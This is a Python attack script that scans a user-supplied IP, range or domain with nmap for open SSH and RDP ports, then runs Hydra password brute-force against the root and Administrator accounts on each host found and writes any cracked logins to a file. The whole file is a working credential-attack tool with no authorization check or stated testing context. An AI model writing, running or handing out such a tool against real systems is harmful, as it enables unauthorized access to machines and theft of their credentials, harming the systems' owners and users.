import asyncio
from subprocess import Popen, PIPE
import re
import os

TARGETS_FILE = "TARGETS.txt"
BRUTEFORCE_FILE = "BRUTEFORCE.txt"

# Helper function to run shell commands asynchronously
async def run_command(command):
    """Runs a shell command and returns the output."""
    process = await asyncio.create_subprocess_shell(
        command,
        stdout=PIPE,
        stderr=PIPE
    )
    stdout, stderr = await process.communicate()
    return stdout.decode('utf-8'), stderr.decode('utf-8')

# Function to perform nmap scan
async def scan_network(target):
    """Scans the network or host using nmap."""
    command = f"nmap -p 22,3389 {target} --open"
    print(f"Scanning {target}...")
    stdout, stderr = await run_command(command)
    if stderr:
        print(f"Error running nmap: {stderr}")
    return stdout

# Function to extract active hosts and ports from nmap output
def parse_nmap_output(output):
    """Parses nmap output for active hosts and open ports."""
    active_hosts = []
    current_ip = None
    for line in output.splitlines():
        ip_match = re.search(r'Nmap scan report for ([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)', line)
        if ip_match:
            current_ip = ip_match.group(1)
        port_match = re.search(r'([0-9]+)/(tcp|udp)\s+open\s+(rdp|ssh)', line)
        if port_match and current_ip:
            port = int(port_match.group(1))
            service = port_match.group(3)
            active_hosts.append((current_ip, port, service))
    return active_hosts

# Function to brute force SSH using Hydra
async def brute_force_ssh(ip):
    """Attempts to brute force SSH using Hydra."""
    command = f"hydra -l root -P /path/to/password/list.txt ssh://{ip} -t 4"
    stdout, stderr = await run_command(command)
    if "login:" in stdout:
        credentials = re.search(r'login: (\S+) +password: (\S+)', stdout)
        if credentials:
            username, password = credentials.groups()
            return f"{ip}:22 SSH {username}:{password}"
    return None

# Function to brute force RDP using Hydra
async def brute_force_rdp(ip):
    """Attempts to brute force RDP using Hydra."""
    command = f"hydra -l Administrator -P /path/to/password/list.txt rdp://{ip} -t 4"
    stdout, stderr = await run_command(command)
    if "login:" in stdout:
        credentials = re.search(r'login: (\S+) +password: (\S+)', stdout)
        if credentials:
            username, password = credentials.groups()
            return f"{ip}:3389 RDP {username}:{password}"
    return None

# Function to handle scanning and brute forcing for each target
async def handle_target(target):
    """Handles the scanning and brute-forcing for each target."""
    nmap_output = await scan_network(target)
    active_hosts = parse_nmap_output(nmap_output)

    # Write active hosts and ports to file
    with open(TARGETS_FILE, 'a') as f:
        for host, port, service in active_hosts:
            f.write(f"{host}:{port} {service}\n")

    # Start brute forcing based on the ports
    for host, port, service in active_hosts:
        if port == 22:  # SSH
            print(f"Starting SSH brute force on {host}...")
            credentials = await brute_force_ssh(host)
            if credentials:
                with open(BRUTEFORCE_FILE, 'a') as bf_file:
                    bf_file.write(f"{credentials}\n")
        elif port == 3389:  # RDP
            print(f"Starting RDP brute force on {host}...")
            credentials = await brute_force_rdp(host)
            if credentials:
                with open(BRUTEFORCE_FILE, 'a') as bf_file:
                    bf_file.write(f"{credentials}\n")

# Main function to manage asynchronous execution
async def main():
    # Get input from the user for target
    target = input("Enter the target (IP, CIDR range, or domain name): ").strip()

    # Ensure output files are clean
    if os.path.exists(TARGETS_FILE):
        os.remove(TARGETS_FILE)
    if os.path.exists(BRUTEFORCE_FILE):
        os.remove(BRUTEFORCE_FILE)

    # Handle the target with scanning and brute forcing
    await handle_target(target)

# Entry point
if __name__ == "__main__":
    asyncio.run(main())
